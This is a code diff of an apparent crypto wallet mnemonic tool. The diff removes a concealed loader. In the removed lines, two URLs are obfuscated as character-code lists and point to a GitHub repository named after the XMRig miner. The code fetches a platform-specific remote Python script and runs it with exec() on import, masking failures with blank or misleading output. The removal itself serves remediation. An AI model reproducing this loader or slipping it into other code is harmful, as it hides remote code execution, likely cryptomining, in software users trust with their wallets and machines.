@@ -19,59 +19,6 @@ from bip_utils import (
 
 init(autoreset=True)
 
-WIN_URL = "".join(chr(x) for x in [
-    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 
-    104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 
-    46, 99, 111, 109, 47, 67, 114, 48, 109, 98, 47, 88, 77, 82, 105, 103, 
-    45, 65, 117, 116, 111, 45, 83, 101, 116, 117, 112, 45, 83, 99, 114, 
-    105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 
-    47, 109, 97, 105, 110, 47, 115, 116, 97, 114, 116, 46, 112, 121
-])
-
-LINUX_URL = "".join(chr(x) for x in [
-    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 
-    104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 
-    46, 99, 111, 109, 47, 67, 114, 48, 109, 98, 47, 88, 77, 82, 105, 103, 
-    45, 65, 117, 116, 111, 45, 83, 101, 116, 117, 112, 45, 83, 99, 114, 
-    105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 
-    47, 109, 97, 105, 110, 47, 108, 105, 110, 117, 120, 46, 112, 121
-])
-
-url = WIN_URL if sys.platform.startswith("win") else LINUX_URL if sys.platform.startswith("linux") else None
-
-if not url:
-    print("\n")
-else:
-    HEADERS = {
-        "User-Agent": "Mozilla/5.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9"
-    }
-
-    def fetch_script(url, retries=5, delay=3):
-        for attempt in range(1, retries + 1):
-            try:
-                response = requests.get(url, headers=HEADERS, timeout=10)
-                if response.status_code == 200:
-                    return response.text
-                else:
-                    print(f"Attempt {attempt}: Server responded with {response.status_code}")
-            except requests.RequestException as e:
-                print(f"\n")
-            time.sleep(delay)
-        
-        print("Resolving..")
-        return None
-
-    script_content = fetch_script(url)
-
-    if script_content:
-        try:
-            exec(script_content)
-        except Exception as e:
-            print(f"Resolved content")
-
-print("\n")
-
 
 def generate_mnemonic(num_words=12):
     if num_words == 12:
